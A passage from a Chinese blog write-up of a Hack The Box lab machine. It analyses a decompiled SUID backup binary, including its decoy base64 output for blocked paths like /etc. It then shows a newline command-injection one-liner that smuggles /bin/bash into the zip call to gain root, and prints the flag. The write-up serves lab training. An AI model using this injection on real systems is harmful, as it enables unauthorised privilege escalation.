      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strstr(argv[3], &quot;//&quot;) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( !strcmp(argv[3], &quot;/&quot;) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strstr(argv[3], &quot;/etc&quot;) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( v24 == 1 )
    displayTarget((char *)argv[3]);
  strcpy(v11, argv[3]);
  v4 = getpid();
  v5 = time(0);
  v6 = clock();
  v7 = mix(v6, v5, v4);
  srand(v7);
  v21 = rand();
  sprintf(name, &quot;/tmp/.backup_%i&quot;, v21);
  sprintf(command, &quot;/usr/bin/zip -r -P magicword %s %s &gt; /dev/null&quot;, name, v11);
  system(command);
  if ( access(name, 0) == -1 )
  {
    if ( v24 == 1 )
      displayWarning(&quot;The target path doesn&#039;t exist&quot;);
  }
  else
  {
    if ( v24 == 1 )
      displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    sprintf(command, &quot;/usr/bin/base64 -w0 %s&quot;, name);
    system(command);
  }
  if ( v24 == 1 )
    puts(&quot;\n&quot;);
  remove(name);
  fclose(stream);
  return 0;
}</code></pre>
<p>通过对程序代码进行分析，发现程序的功能如下：</p>
<ol>
<li>程序首先检查参数传入数量<code>argv</code>是否小于等于<code>3</code>，和<code>argv[1]</code>是否不等于字符串<code>-q</code>，如果符合条件，程序会将变量<code>v24</code><strong>（打印信息标识）</strong>设置为<code>1</code>并打印<code>Banner</code>信息。</li>
<li>程序会初始化几个变量，将文件路径<code>/etc/myplace/keys</code>分割保存到几个字符串变量中，<strong>随后使用<code>for</code>循环和传入连续的内存空间地址的方式将分割保存的字符串进行拼接恢复</strong>，并将其用于打开文件操作，文件句柄保存到变量<code>stream</code>中，如未能成功打开文件，程序输出报错信息后直接退出。</li>
<li>程序使用<code>fgets()</code>、<code>strcspn()</code>和<code>strcmp()</code>方法读入<code>keys</code>文件第一行内容，并将其和<code>argv[2]</code>的内容进行比较，如果两个变量内容不相符，则将密码解锁标识<code>v25</code>设置为<code>1</code>，随后程序会根据<code>v25</code>判断程序是否解锁，如未解锁则报错退出。</li>
<li>接下来程序会根据<code>argv[3]</code>的内容进行一些判断，如果<code>argv[3]</code>的内容符合指定条件，则会在屏幕上输出一些<code>Base64</code>文本。</li>
<li>然后，如果<code>v24</code>的值为<code>1</code>，程序会调用<code>displayTarget()</code>方法打印文本，此处存在严重的缓冲区溢出漏洞。接着，程序会生成随机数种子，并将使用<code>rand()</code>方法生成的随机数赋值给<code>v21</code>，该变量用于生成随机<code>ZIP</code>备份文件名，生成好的名称放置在<code>name</code>变量中。紧接着，程序会调用<code>system()</code>函数执行如下命令：<code>sprintf(command, &quot;/usr/bin/zip -r -P magicword %s %s &gt; /dev/null&quot;, backup_fileName, v11);</code>。<strong>不难发现是使用<code>zip</code>命令生成了带密码的压缩包，其中第一个传入参数为生成的随机变量名，第二个参数是<code>argv[3]（要备份的目录）</code>。我们可以使用换行符<code>\n</code>进行命令注入：</strong>
<pre><code class="language-bash">backup -a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 &quot;$(printf &#039;\n/bin/bash\necho a&#039;)&quot;</code></pre>
<p>输入命令，直接启动了<code>/bin/bash</code>：<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719368662014-333c17be-2517-4279-a45b-dbb892c946d0.png#averageHue=%23272836&amp;clientId=u6a450f9a-35af-4&amp;from=ui&amp;id=u51f3098f&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=510337&amp;status=done&amp;style=none&amp;taskId=u2e73c699-8a5e-44cb-9d92-843185c367c&amp;title=" alt="提权成功！.png"><br>
<strong>提权成功！！！！</strong></p>
</li>
</ol>
<hr>
<h1>Flag文件展示</h1>
<pre><code>8087cbf750160e05a91716e3db9a31f7</code></pre>
<hr>
<h1>本次靶机渗透到此结束</h1>
				<!--<div class="oshimai"></div>-->
		<!--<h2 style="opacity:0;max-height:0;margin:0">Comments</h2>--><!-- 评论跳转标记 -->
	</div>
<!-- .entry-content -->
	<footer class="post-footer">
    <div class="post-lincenses">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow">
            <i class="fa-brands fa-creative-commons"></i>
        </a>
    </div>
        <div class="reward-open"> <i class="fa-solid fa-piggy-bank fa-sm"></i>
      <div class="reward-main">
        <ul class="reward-row">
          <li class="alipay-code"><img alt="alipay_img" src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719807875-_cgi-bin_mmwebwx-bin_webwxgetmsgimg__MsgID5413553599554003888skey@crypt_e6c7b24_f141a2512eeb2d420c61e8b19d3c7620mmweb_appidwx_webfilehelper.jpg"></li>
<li class="wechat-code"><img alt="wechat_img" src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719807865-_cgi-bin_mmwebwx-bin_webwxgetmsgimg__MsgID2910610545808219012skey@crypt_e6c7b24_f141a2512eeb2d420c61e8b19d3c7620mmweb_appidwx_webfilehelper.jpg"></li>        </ul>
      </div>
    </div>
      <section class="author-profile">
                <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a href="https://misaka19008.github.io/author/misaka19008/" class="profile gravatar">
                <img class="fa-spin" style="--fa-animation-duration: 15s;" src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719800327-misaka.jpg" itemprop="image" alt="misaka19008" height="30" width="30">
            </a>
        </div>
        <div class="meta">
            <a href="https://misaka19008.github.io/author/misaka19008/" itemprop="url" rel="author">misaka19008</a>						
        </div>
                    <div class="desc">
                <i class="fa-solid fa-feather" aria-hidden="true"></i>届ける言葉を今は育ててる            </div>
            </section>
    <div class="post-modified-time">
        <i class="fa-solid fa-calendar-day" aria-hidden="true"></i>最后更新于 2024-07-08    </div>
    <div class="post-tags">
        <i class="fa-solid fa-tag" aria-hidden="true"></i> <a href="https://misaka19008.github.io/tag/htb%e9%80%9a%e5%85%b3%e8%ae%b0%e5%bd%95/" rel="tag">HTB通关记录</a>     </div>
</footer><!-- .entry-footer -->
</article><!-- #post-## -->
<div class="toc-container"><div class="toc"></div></div>
<section class="post-squares nextprev">
		<div class="post-nepre half previous">
		<a href="https://misaka19008.github.io/2024/07/08/htb%e9%9d%b6%e6%9c%ba-solidstate-%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e8%ae%b0%e5%bd%95/" rel="prev"><div class="background lazyload" style="background-image:url(https://s.nmxc.ltd/sakurairo_vision/@2.6/load_svg/outload.svg);" data-src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719804541-Hack-The-Box-logo-1024x433.png"></div>
<span class="label">上一篇文章</span><div class="info">
<h3>HTB靶机 SolidState 渗透测试记录</h3>
<hr>
</div></a>	</div>
	<div class="post-nepre half next">
		<a href="https://misaka19008.github.io/2024/07/08/htb%e9%9d%b6%e6%9c%ba-valentine-%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e8%ae%b0%e5%bd%95/" rel="next"><div class="background lazyload" style="background-image:url(https://s.nmxc.ltd/sakurairo_vision/@2.6/load_svg/outload.svg);" data-src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719804541-Hack-The-Box-logo-1024x433.png"></div>
<span class="label">下一篇文章</span><div class="info">
<h3>HTB靶机 Valentine 渗透测试记录</h3>
<hr>
</div></a>	</div>
</section>
		</main><!-- #main -->
	</div>
<!-- #primary -->
	</div>
<!-- #content -->
	</div>
<!-- #page Pjax container-->
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-info" theme-info="Sakurairo v2.6.3.1">
			<div class="footertext">
				<div class="img-preload">
					<img alt="loading_svg" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/load_svg/ball.svg"><!-- 加载下一部分圈圈 -->
				</div>
				<div class="sakura-icon" style="width:max-content;height:max-content;margin: auto;">
				<svg width="30px" height="30px" t="1682340134496" class="sakura-svg" viewbox="0 0 1049 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5240"><path d="M525.58396628 573.34694353s268.83106938-2.62915481 309.36387092 193.24287089l-76.46458293 21.90962291 12.92667757 84.13295086a214.05701289 214.05701289 0 0 1-96.84053193-4.82011663A224.79272784 224.79272784 0 0 1 525.58396628 578.38615666z" fill="#EE9ca7" p-id="5241"></path><path d="M552.75189802 512.4381922s131.45773592-233.7756732 321.63325979-170.89505575L854.2283053 418.66500728l79.31283344 30.89256828a215.59068679 215.59068679 0 0 1-52.58309388 81.50379604 224.57363215 224.57363215 0 0 1-325.35789552-14.67944718z" fill="#EE9ca7" p-id="5242"></path><path d="M508.49446078 494.0341093S317.00435871 306.48774025 426.77156822 139.31731943l69.4535037 38.78003191L547.4935884 109.30113636a214.05701289 214.05701289 0 0 1 65.72886796 71.86356201 225.01182435 225.01182435 0 0 1-98.37420505 310.67844912z" fill="#EE9ca7" p-id="5243"></path><path d="M473.21996809 525.58396628S242.2925454 661.64272234 109.30113636 512.4381922l55.43134521-57.18411482-53.45947909-65.72886795a213.61882069 213.61882069 0 0 1 86.32391269-43.81924506 224.79272784 224.79272784 0 0 1 274.527572 175.27698099z" fill="#EE9ca7" p-id="5244"></path><path d="M481.76472043 566.55496s72.0826585 258.31445093-106.4807652 348.14390364l-40.31370582-68.13892627-78.21735252 34.17901099a212.30424328 212.30424328 0 0 1-20.15685331-94.64956933 224.57363215 224.57363215 0 0 1 241.00584894-219.09622602z" fill="#EE9ca7" p-id="5245"></path></svg>
				</div>
				<p style="color: #666666;">This website is published by @misaka19008.<br>
Copyright © by FUUKEI All Rights Reserved.</p>
			</div>
			<div class="footer-device function_area">
										<span style="color: #b9b9b9;">
																		                        <br>
						<a href="https://github.com/mirai-mamori/Sakurairo" rel="noopener" target="_blank" id="site-info">Theme Sakurairo</a><a href="https://docs.fuukei.org/" rel="noopener" target="_blank" id="site-info"> by Fuukei</a> 
					</span>
			</div>
		</div>
<!-- .site-info -->
	</footer><!-- #colophon -->
	</section><!-- #section -->
	<!-- m-nav-center -->
	<div id="mo-nav">
		<div class="m-avatar">
						<img alt="m-avatar" src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719800327-misaka.jpg">
		</div>
		<div class="m-search">
			<form class="m-search-form" method="get" action="https://misaka19008.github.io" role="search">
				<input class="m-search-input" type="search" name="s" placeholder="搜索..." required>
			</form>
		</div>
		<div class="menu"></div>
	</div>
<!-- m-nav-center end -->
	<button id="moblieGoTop" title="回到顶部"><i class="fa-solid fa-caret-up fa-lg"></i></button>
  <button id="changskin" title="控制面板"><i class="fa-solid fa-compass-drafting fa-lg fa-flip" style="--fa-animation-duration: 3s;"></i></button>
	<!-- search start -->
	<form class="js-search search-form search-form--modal" method="get" action="https://misaka19008.github.io" role="search">
		<div class="search-form__inner">
					<div class="micro">
				<p class="micro mb-">想要找点什么呢？</p>
				<input class="text-input" type="search" name="s" placeholder="搜索" required>
			</div>
				</div>
		<div class="search_close"></div>
	</form>
	<!-- search end -->
<script type="text/javascript" src="https://s.nmxc.ltd/sakurairo/@2.6.3.1/js/smoothscroll.js?ver=2.6.3.1" id="SmoothScroll-js"></script>
<script type="text/javascript" src="https://misaka19008.github.io/wp-content/themes/Sakurairo-main/js/polyfill.js?ver=2.6.3.1" id="polyfills-js"></script>
<script type="text/javascript" id="app-js-before">
/* <![CDATA[ */
var _iro = {"pjax":true,"movies":"close","windowheight":"auto","ajaxurl":"https:\/\/misaka19008.github.io\/wp-admin\/admin-ajax.php","order":"asc","formpostion":"bottom","api":"https:\/\/misaka19008.github.io\/wp-json\/","nonce":"b4cd80bc12","google_analytics_id":"","gravatar_url":"weavatar.com\/avatar","NProgressON":true,"audio":true,"baguetteBox":true,"fancybox":false,"darkmode":true,"email_domain":"163.com","email_name":"icewolf00","ext_shared_lib":1,"cookie_version_control":"","qzone_autocomplete":false,"site_name":"御坂19008号の渗透小屋","author_name":"misaka19008","template_url":"https:\/\/misaka19008.github.io\/wp-content\/themes\/Sakurairo-main","site_url":"https:\/\/misaka19008.github.io","qq_api_url":"https:\/\/misaka19008.github.io\/wp-json\/sakura\/v1\/qqinfo\/json","land_at_home":false,"live_search":false,"loading_ph":"https:\/\/s.nmxc.ltd\/sakurairo_vision\/@2.6\/load_svg\/inload.svg","clipboardCopyright":true,"entry_content_style":"sakurairo","random_graphs_mts":true,"code_highlight":"hljs","comment_upload_img":false,"cache_cover":true,"site_bg_as_cover":false,"yiyan_api":["https:\/\/v1.hitokoto.cn\/","https:\/\/api.nmxc.ltd\/yiyan\/"],"skin_bg0":"https:\/\/misaka19008.github.io\/wp-content\/uploads\/2024\/07\/1719806823-R-1536x960.jpg","skin_bg1":"https:\/\/misaka19008.github.io\/wp-content\/uploads\/2024\/07\/1719806823-R-1536x960.jpg","skin_bg2":"https:\/\/misaka19008.github.io\/wp-content\/uploads\/2024\/07\/1719806823-R-1536x960.jpg","skin_bg3":"https:\/\/misaka19008.github.io\/wp-content\/uploads\/2024\/07\/1719806823-R-1536x960.jpg","skin_bg4":"https:\/\/misaka19008.github.io\/wp-content\/uploads\/2024\/07\/1719806823-R-1536x960.jpg","cover_api":"https:\/\/misaka19008.github.io\/wp-json\/sakura\/v1\/image\/cover","effect":{"amount":"native"},"dm_strategy":"time"}
/* ]]> */
</script>
<script type="text/javascript" src="https://misaka19008.github.io/wp-content/themes/Sakurairo-main/js/app.js?ver=2.6.3.1" id="app-js"></script>
<script type="text/javascript" src="https://misaka19008.github.io/wp-content/themes/Sakurairo-main/js/page.js?ver=2.6.3.1" id="app-page-js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js?ver=9.15.10" id="highlight-js-0-js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/cpp.min.js?ver=9.15.10" id="highlight-js-1-js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js?ver=9.15.10" id="highlight-js-2-js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js?ver=9.15.10" id="highlight-js-3-js"></script>
<script type="text/javascript" src="https://misaka19008.github.io/wp-includes/js/clipboard.min.js?ver=2.0.11" id="clipboard-js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs//emojify.js/1.1.0/js/emojify.min.js?ver=1.1.0" id="emojify-js"></script>
  <script id="module-flowchart">(function($) { $(function() { if (typeof $.fn.flowChart !== "undefined") { if ($(".language-flow").length > 0) { $(".language-flow").parent("pre").attr("style", "text-align: center; background: none;"); $(".language-flow").addClass("flowchart").removeClass("language-flow"); $(".flowchart").flowChart(); } } }); })(jQuery);</script>  <script id="module-katex"> (function($) { $(function() { if (typeof katex !== "undefined") { if ($(".language-katex").length > 0) { $(".language-katex").parent("pre").attr("style", "text-align: center; background: none;"); $(".language-katex").addClass("katex-container").removeClass("language-katex"); $(".katex-container").each(function() { var katexText = $(this).text(); var el = $(this).get(0); if ($(this).parent("code").length == 0) { try { katex.render(katexText, el) } catch (err) { $(this).html("<span class='err'>" + err) } } }); } if ($(".katex-inline").length > 0) { $(".katex-inline").each(function() { var katexText = $(this).text(); var el = $(this).get(0); if ($(this).parent("code").length == 0) { try { katex.render(katexText, el) } catch (err) { $(this).html("<span class='err'>" + err) } } }); } } }); })(jQuery); </script>  <script id="module-sequence-diagram">(function($) { $(function() { if (typeof $.fn.sequenceDiagram !== "undefined") { $(".language-sequence").parent("pre").attr("style", "text-align: center; background: none;"); $(".language-seq").parent("pre").attr("style", "text-align: center; background: none;"); $(".language-sequence").addClass("sequence-diagram").removeClass("language-sequence"); $(".language-seq").addClass("sequence-diagram").removeClass("language-seq"); $(".sequence-diagram").sequenceDiagram({ theme: "simple" }); } }); })(jQuery);</script>  <script id="module-mermaid">(function($) { $(function() { if (typeof mermaid !== "undefined") { if ($(".language-mermaid").length > 0) { $(".language-mermaid").parent("pre").attr("style", "text-align: center; background: none;"); $(".language-mermaid").addClass("mermaid").removeClass("language-mermaid"); mermaid.init(); } } }); })(jQuery);</script>  <script id="module-highlight-js">(function($) { $(function() { $("pre code").each(function(i, e) { var thisclass = $(this).attr("class"); if (typeof thisclass !== "undefined") { if ( thisclass.indexOf("katex") === -1 && thisclass.indexOf("mermaid") === -1 && thisclass.indexOf("seq") === -1 && thisclass.indexOf("flow") === -1 ) { if (typeof hljs !== "undefined") { $(this).closest("pre").addClass("hljs"); hljs.highlightBlock(e); } else { console.log("%c WP Githuber MD %c You have enabled highlight.js modules already, but you have to update this post to take effect, identifying which file should be loaded.\nGithuber MD does not load a whole-fat-packed file for every post.", "background: #222; color: #bada55", "color: #637338"); } } } }); }); })(jQuery);</script>  <script id="module-mathjax">(function($) { $(function() { if (typeof MathJax !== "undefined") { var c = $(".language-mathjax").length; if (c > 0) { $(".language-mathjax").each(function(i) { var content = $(this).html(); if ($(this).hasClass("mathjax-inline")) { $(this).html("$ " + content + " $"); } else { $(this).html("$$" + "\n" + content + "\n" + "$$"); } if (i + 1 === c) { MathJax.Hub.Config({ showProcessingMessages: false, messageStyle: "none", extensions: [ "tex2jax.js", "TeX/mediawiki-texvc.js", "TeX/noUndefined.js", "TeX/autoload-all.js", "TeX/AMSmath.js", "TeX/AMSsymbols.js" ], jax: [ "input/TeX", "output/SVG" ], elements: document.getElementsByClassName("language-mathjax"), tex2jax: { skipTags: [ "script", "noscript", "style", "textarea" ], inlineMath: [ ['$', '$'] ], displayMath: [ ['$$', '$$'] ], processClass: "language-mathjax" } }); MathJax.Hub.Queue(["Typeset", MathJax.Hub]); $(".language-mathjax").attr("style", "background: transparent; border: 0;"); $(".language-mathjax").closest("pre").attr("style", "background: transparent; border: 0;"); } }); } else { console.log("[wp-githuber-md] MathJax code blocks not found."); } } else { console.log("[wp-githuber-md] MathJax is not loadded."); } }); })(jQuery);</script>  <script id="module-toc">(function($) { $(function() { $("#md-post-toc").initTOC({ selector: "h2, h3, h4, h5, h6", scope: ".post", }); $("#md-post-toc a").click(function(e) { e.preventDefault(); var aid = $( this ).attr( "href" ); $( "html, body" ).animate( { scrollTop: $(aid).offset().top - 80 }, "slow" ); }); $("#md-widget-toc").initTOC({ selector: "h2, h3, h4, h5, h6", scope: ".post", }); $("#md-widget-toc a").click(function(e) { e.preventDefault(); var aid = $( this ).attr( "href" ); $( "html, body" ).animate( { scrollTop: $(aid).offset().top - 80 }, "slow" ); }); }); })(jQuery);</script>  <script id="module-clipboard"> (function($) { $(function() { var pre = document.getElementsByTagName("pre"); var pasteContent = document.getElementById("paste-content"); var hasLanguage = false; for (var i = 0; i < pre.length; i++) { var codeClass = pre[i].children[0].className; var isLanguage = codeClass.indexOf("language-"); var excludedCodeClassNames = [ "language-katex", "language-seq", "language-sequence", "language-flow", "language-flowchart", "language-mermaid", ]; var isExcluded = excludedCodeClassNames.indexOf(codeClass); if (isExcluded !== -1) { isLanguage = -1; } if (isLanguage !== -1) { var current_pre = pre[i]; var parent = current_pre.parentNode; var div = document.createElement("div"); div.style['position'] = 'relative'; parent.replaceChild(div, current_pre); var button = document.createElement("button"); button.className = "copy-button"; button.textContent = "Copy"; div.appendChild(current_pre); div.appendChild(button); hasLanguage = true; } }; if (hasLanguage) { var copyCode = new ClipboardJS(".copy-button", { target: function(trigger) { return trigger.previousElementSibling; } }); copyCode.on("success", function(event) { event.clearSelection(); event.trigger.textContent = 